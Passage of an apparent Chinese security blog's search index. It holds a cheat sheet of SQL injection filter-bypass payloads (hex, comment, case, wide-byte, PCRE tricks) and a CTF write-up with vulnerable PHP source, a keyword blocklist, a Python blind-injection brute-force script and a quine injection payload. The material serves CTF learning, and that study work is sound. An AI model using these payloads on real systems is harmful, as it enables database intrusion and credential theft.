class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name  <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;users&quot;</span><br></pre></td></tr></table></figure><p>　　这个时候如果引号被过滤了，那么上面的<code>where</code>子句就无法使用了。那么遇到这样的问题就要使用<strong>十六进制</strong>来处理这个问题了。<br><code>　　users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的sql语句就变为了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name  <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span></span><br></pre></td></tr></table></figure><h2 id="4-逗号绕过（使用from或者offset）："><a href="#4-逗号绕过（使用from或者offset）：" class="headerlink" title="4.逗号绕过（使用from或者offset）："></a>4.逗号绕过（使用from或者offset）：</h2><p>　　在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用<code>from to</code>的方式来解决：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>　　使用join：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>     #等价于</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br></pre></td></tr></table></figure><p>　　使用like：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ascii(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">80</span>   #等价于</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">&#x27;r%&#x27;</span></span><br></pre></td></tr></table></figure><p>　　对于<code>limit</code>可以使用<code>offset</code>来绕过：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"># 等价于下面这条<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="5-比较符号（）绕过（过滤了：sqlmap盲注经常使用，使用between的脚本）："><a href="#5-比较符号（）绕过（过滤了：sqlmap盲注经常使用，使用between的脚本）：" class="headerlink" title="5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）："></a>5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）：</h2><h3 id="使用greatest-、least（）：（前者返回最大值，后者返回最小值）"><a href="#使用greatest-、least（）：（前者返回最大值，后者返回最小值）" class="headerlink" title="使用greatest()、least（）：（前者返回最大值，后者返回最小值）"></a>使用greatest()、least（）：（前者返回最大值，后者返回最小值）</h3><p>　同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到<code>greatest</code>来进行绕过了。<br>　　最常见的一个盲注的sql语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span></span><br></pre></td></tr></table></figure><p>　　此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用<code>greatest</code>来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。<br>　　那么上面的这条sql语句可以使用<code>greatest</code>变为如下的子句:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure><h3 id="使用between-and："><a href="#使用between-and：" class="headerlink" title="使用between and："></a>使用between and：</h3><p>  between a and b：</p><p>between 1 and 1; 等价于 &#x3D;1</p><h2 id="6-or-and-xor-not绕过："><a href="#6-or-and-xor-not绕过：" class="headerlink" title="6.or and xor not绕过："></a>6.or and xor not绕过：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span><span class="operator">=</span><span class="operator">&amp;&amp;</span>  <span class="keyword">or</span><span class="operator">=</span><span class="operator">||</span>   xor<span class="operator">=</span><span class="operator">|</span>   <span class="keyword">not</span><span class="operator">=</span><span class="operator">!</span></span><br></pre></td></tr></table></figure><h2 id="7-绕过注释符号（-，–-后面跟一个空格））过滤："><a href="#7-绕过注释符号（-，–-后面跟一个空格））过滤：" class="headerlink" title="7.绕过注释符号（#，–(后面跟一个空格））过滤："></a>7.绕过注释符号（#，–(后面跟一个空格））过滤：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3||&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>　　最后的or ‘1闭合查询语句的最后的单引号，或者：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="8-绕过："><a href="#8-绕过：" class="headerlink" title="8.&#x3D;绕过："></a>8.&#x3D;绕过：</h2><p>　　使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p><h2 id="9-绕过union，select，where等："><a href="#9-绕过union，select，where等：" class="headerlink" title="9.绕过union，select，where等："></a>9.绕过union，select，where等：</h2><h3 id="（1）使用注释符绕过："><a href="#（1）使用注释符绕过：" class="headerlink" title="（1）使用注释符绕过："></a>（1）使用注释符绕过：</h3><p>　　常用注释符：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>，<span class="comment">-- , /**/, #, --+, -- -, ;,%00,--a</span></span><br></pre></td></tr></table></figure><p>　　用法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U<span class="comment">/**/</span> NION <span class="comment">/**/</span> SE<span class="comment">/**/</span> LECT <span class="comment">/**/</span><span class="keyword">user</span>，pwd <span class="keyword">from</span> <span class="keyword">user</span></span><br></pre></td></tr></table></figure><h3 id="（2）使用大小写绕过："><a href="#（2）使用大小写绕过：" class="headerlink" title="（2）使用大小写绕过："></a>（2）使用大小写绕过：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;UnIoN/**/SeLeCT</span></span><br></pre></td></tr></table></figure><h3 id="（3）内联注释绕过："><a href="#（3）内联注释绕过：" class="headerlink" title="（3）内联注释绕过："></a>（3）内联注释绕过：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span></span><br></pre></td></tr></table></figure><h3 id="（4）-双关键字绕过（若删除掉第一个匹配的union就能绕过）："><a href="#（4）-双关键字绕过（若删除掉第一个匹配的union就能绕过）：" class="headerlink" title="（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）："></a>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;UNIunionONSeLselectECT1,2,3–-</span></span><br></pre></td></tr></table></figure><h2 id="10-通用绕过（编码）："><a href="#10-通用绕过（编码）：" class="headerlink" title="10.通用绕过（编码）："></a>10.通用绕过（编码）：</h2><p>　　如URLEncode编码，ASCII,HEX,unicode编码绕过：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>即<span class="operator">%</span><span class="number">6</span>f<span class="operator">%</span><span class="number">72</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">3</span>d<span class="operator">%</span><span class="number">31</span>，而Test也可以为<span class="type">CHAR</span>(<span class="number">101</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">97</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">116</span>)。</span><br></pre></td></tr></table></figure><h2 id="11-等价函数绕过："><a href="#11-等价函数绕过：" class="headerlink" title="11.等价函数绕过："></a>11.等价函数绕过：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line"></span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br><span class="line"></span><br><span class="line">举例：<span class="built_in">substring</span>()和substr()无法使用时：?id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="keyword">and</span><span class="operator">+</span>ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span><span class="operator">+</span>pwd<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users<span class="operator">+</span>limit<span class="operator">+</span><span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span>　</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure><h2 id="12-宽字节注入："><a href="#12-宽字节注入：" class="headerlink" title="12.宽字节注入："></a>12.宽字节注入：</h2><p>　　过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 &#39; 。</p><p>　　在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p><p>　　（1）%df 吃掉 \ 具体的方法是 urlencode(‘) &#x3D; %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>　　（2）将 &#39; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p><h3 id="一般产生宽字节注入的PHP函数："><a href="#一般产生宽字节注入的PHP函数：" class="headerlink" title="一般产生宽字节注入的PHP函数："></a>一般产生宽字节注入的PHP函数：</h3><p>  1.replace（）：过滤 ‘ \ ，将 ‘ 转化为 &#39; ，将 \  转为 \，将 “ 转为 &quot; 。用思路一。</p><p>  2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。用思路一</p><p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p><p>　 　3.mysql_real_escape_string()：转义下列字符：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00     \n     \r     \     <span class="string">&#x27;     &quot;     \x1a</span></span><br></pre></td></tr></table></figure><p>（防御，将mysql设置为gbk即可）</p><h2 id="PCRE绕过："><a href="#PCRE绕过：" class="headerlink" title="PCRE绕过："></a>PCRE绕过：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span><span class="comment">/*&#x27;+&#x27;a&#x27;*1000001+&#x27;*/</span><span class="keyword">select</span></span><br></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> 绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yet_another_mysql_injection</title>
      <link href="/yet-another-mysql-injection/"/>
      <url>/yet-another-mysql-injection/</url>
      
        <content type="html"><![CDATA[<h1 id="2021-第五空间智能安全大赛-Web-yet-another-mysql-injection"><a href="#2021-第五空间智能安全大赛-Web-yet-another-mysql-injection" class="headerlink" title="2021-第五空间智能安全大赛-Web-yet_another_mysql_injection"></a>2021-第五空间智能安全大赛-Web-yet_another_mysql_injection</h1><ol><li>初始界面</li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230801194529159.png" alt="image-20230801194529159"></p><p>查看源代码发现源码文件  <strong>&#x2F;?source</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>源码分析</li></ol><ul><li><code>alertMes($mes, $url)</code>：该函数接受两个参数，<code>$mes</code>（要显示的消息）和<code>$url</code>（显示消息后要重定向的URL）。它使用JavaScript输出一个包含给定消息的警告弹窗，然后将用户重定向到指定的URL。</li><li><code>checkSql($s)</code>：该函数接受一个参数<code>$s</code>（一个字符串），并检查其中是否包含任何可疑的SQL关键词或字符，这可能表明试图进行SQL注入攻击。如果发现任何可疑关键词或字符，它将使用<code>alertMes</code>函数显示警告，并将用户重定向到 “index.php”。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag| =| &gt;|&lt; |and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>模式分隔符后的”i”标记这是一个大小写不敏感的搜索</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sleep</span> 可以用benchmark代替</span><br><span class="line">&lt;,&gt; 可以用least(),greatest()代替</span><br><span class="line">=,<span class="keyword">in</span> 可以用like代替</span><br><span class="line">substr 可以用mid代替</span><br><span class="line">空格 可以用/**/代替</span><br></pre></td></tr></table></figure><ol start="3"><li>注入脚本测试</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">char = <span class="string">&#x27;01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/*-+?~#!@&amp;%&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">password</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://challenge-f48e2f483110ea2f.sandbox.ctfhub.com:10800/index.php&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> char:</span><br><span class="line">            payload = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;1&#x27;or/**/password/**/like/**/&#x27;<span class="subst">&#123;flag + i&#125;</span>%&#x27;#&quot;</span></span><br><span class="line">                       &#125;</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            res = requests.post(url=url, data=payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;something wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                flag += i</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ctfhub&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;game over&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;~&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;just ok&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    password()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>运行结果 <code>o2cqmlyo0kpjkdyocm8cfbygzaievxbw       just ok</code></strong></p><p>通过<code>用户名 admin</code> <code>密码 o2cqmlyo0kpjkdyocm8cfbygzaievxbw</code> 登录 还是显示错误 </p><ol start="4"><li>通过网上writeup 发现</li></ol><p>使用了 <strong>quine注入</strong></p><p><strong>1.首先先了解一下replace()函数</strong></p><ul><li>replace(object,search,replace)</li><li>把object对象中出现的的search全部替换成replace</li></ul><p>注入的payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/</span></span><br><span class="line"><span class="string">replace(replace(&#x27;</span><span class="number">1</span>&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>replace(replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;)#<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure><p><code>CHAR(34)=&quot;       CHAR(39)=&#39;        CHAR(33)=!         char(46)=.</code></p><h2 id="quine注入"><a href="#quine注入" class="headerlink" title="quine注入"></a>quine注入</h2><blockquote><p>核心思想：</p><p>sql语句执行的结果等于sql语句本身</p></blockquote><p>即利用sql执行的结果等于它本身绕过判断：</p><p>$row[‘password’] &#x3D;&#x3D;&#x3D; $password</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select replace(replace(&#x27;</span><span class="number">1</span>&quot; union select replace(replace(&quot;.&quot;,&quot;,<span class="string">&#x27;) ,., &quot;.&quot;)#&#x27;</span>,&quot;, &#x27;), ., &#x27;1 union select replace(replace(&quot;.&quot;, &quot;,<span class="string">&#x27;), ., &quot;.&quot;)#&#x27;</span>)#</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -[CTF, ctfhub] </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>find_it</title>
      <link href="/find-it/"/>
      <url>/find-it/</url>
      
